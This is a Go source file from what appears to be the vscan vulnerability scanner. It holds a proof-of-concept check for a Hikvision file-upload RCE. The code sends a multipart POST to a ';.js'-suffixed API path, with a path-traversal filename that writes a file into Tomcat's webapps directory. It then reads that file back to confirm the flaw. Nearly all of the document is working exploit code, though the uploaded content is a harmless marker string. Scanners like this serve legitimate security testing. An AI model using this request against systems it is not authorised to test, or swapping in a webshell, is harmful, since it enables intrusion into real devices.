package HIKVISION

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func Hikvision_api_files_rce(u string) bool {

	var payload = "--ea26cdac4990498b32d7a95ce5a5135c\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/dac4990498b32d7a95ce5a512.txt\"\r\n\r\nea26cdac4990498b32d7a95ce5a5135c\r\n--ea26cdac4990498b32d7a95ce5a5135c--"

	header := make(map[string]string)
	header["Content-Type"] = "multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c"

	if req, err := pkg.HttpRequset(u+"/center/api/files;.js", "POST", payload, false, header); err == nil {
		//pkg.GoPocLog(req.Body)
		if req.StatusCode == 200 {
			if req2, err := pkg.HttpRequset(u+"/clusterMgr/dac4990498b32d7a95ce5a512.txt;.js", "GET", "", false, nil); err == nil {
				if req2.StatusCode == 200 && strings.Contains(req2.Body, "ea26cdac4990498b32d7a95ce5a5135c") {
					pkg.GoPocLog(fmt.Sprintf("Found vuln hikvision api_file_upload_rce|%s\n", u+"/clusterMgr/dac4990498b32d7a95ce5a512.txt;.js"))
					return true
				}
			}
		}
	}
	return false
}
